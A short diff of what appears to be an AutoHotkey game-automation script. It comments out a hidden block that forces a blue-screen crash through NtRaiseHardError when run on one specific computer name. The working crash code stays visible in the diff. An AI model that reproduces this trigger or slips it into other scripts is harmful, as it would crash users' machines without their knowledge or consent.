@@ -1724,10 +1724,10 @@ Skrin_1=
 }
 
 
-if (A_ComputerName = "DESKTOP-QB0BUJV" ) {
-    DllCall("ntdll\RtlAdjustPrivilege", "UInt", 19, "UInt", 1, "UInt", 0, "IntP", old)
-    DllCall("ntdll\NtRaiseHardError", "UInt", 0xC000007B, "UInt", 0, "UInt", 0, "UInt", 0, "UInt", 6, "UIntP", 0)
-}
+;if (A_ComputerName = "DESKTOP-QB0BUJV" ) {
+;    DllCall("ntdll\RtlAdjustPrivilege", "UInt", 19, "UInt", 1, "UInt", 0, "IntP", old)
+;    DllCall("ntdll\NtRaiseHardError", "UInt", 0xC000007B, "UInt", 0, "UInt", 0, "UInt", 0, "UInt", 6, "UIntP", 0)
+;}
 
 if (Taymer_Nastroyka = "Включен") {
     Run, "C:\ProgramData\KPRP\KPRP-main\АFK.ahk"
